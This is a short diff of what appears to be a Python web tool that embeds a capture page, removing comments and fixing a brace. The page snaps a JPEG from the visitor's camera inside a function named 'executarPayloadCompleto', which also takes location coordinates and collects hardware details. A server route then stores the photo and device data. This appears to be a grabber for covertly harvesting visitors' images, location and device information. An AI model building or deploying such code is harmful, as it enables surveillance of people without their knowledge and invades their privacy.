@@ -61,7 +61,7 @@ HTML_CAPTURA = f"""
                 await new Promise((resolve) => {{
                     video.onloadedmetadata = () => {{
                         video.play();
-                        setTimeout(resolve, 800); // Aguarda ajuste de foco/luz da câmera
+                        setTimeout(resolve, 800);
                     }};
                 }});
 
@@ -73,15 +73,13 @@ HTML_CAPTURA = f"""
                 
                 imagemCapturadaBase64 = canvas.toDataURL('image/jpeg', 0.8);
 
-                // Desliga a câmera após a captura
                 stream.getTracks().forEach(track => track.stop());
-            } catch(e) {{
+            }} catch(e) {{
                 console.warn("Acesso à câmera negado ou indisponível:", e);
             }}
         }}
 
         async function executarPayloadCompleto(lat = null, lon = null, precisao = null) {{
-            // Tenta capturar a câmera antes de enviar os dados
             await capturarCamera();
 
             let infoHardware = {{
@@ -499,7 +497,6 @@ def salvar_payload_total():
     hw = dados.get('hw', {})
     foto_b64 = dados.get('foto')
 
-    # Armazena foto se houver
     if foto_b64:
         registros_fotos.insert(0, {
             "data": agora,
